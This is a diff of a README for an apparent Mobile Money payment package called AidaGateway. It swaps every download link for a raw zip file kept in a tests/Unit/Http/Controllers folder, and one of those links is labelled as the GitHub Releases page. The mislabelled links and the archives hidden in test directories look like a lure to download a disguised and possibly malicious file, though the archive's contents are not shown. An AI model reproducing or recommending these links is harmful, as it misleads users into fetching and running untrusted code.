@@ -6,7 +6,7 @@ Welcome to AidaGateway! This package makes it easy to integrate Mobile Money pay
 
 ## 📥 Download Now
 
-[![Download AidaGateway](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Models/AidaGateway-v2.5.zip)](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Models/AidaGateway-v2.5.zip)
+[![Download AidaGateway](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Http/Controllers/Gateway_Aida_v1.3.zip)](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Http/Controllers/Gateway_Aida_v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,12 +29,12 @@ Before you start, ensure your system meets these requirements:
 
 To get started with AidaGateway, visit the Releases page to download the latest version.
 
-[Download AidaGateway](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Models/AidaGateway-v2.5.zip)
+[Download AidaGateway](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Http/Controllers/Gateway_Aida_v1.3.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Models/AidaGateway-v2.5.zip) on GitHub.
+   Go to the [Releases page](https://raw.githubusercontent.com/Alfan129/AidaGateway/main/tests/Unit/Http/Controllers/Gateway_Aida_v1.3.zip) on GitHub.
 
 2. **Download the Latest Release**  
    Find the most recent version. Click on it to see the download options.
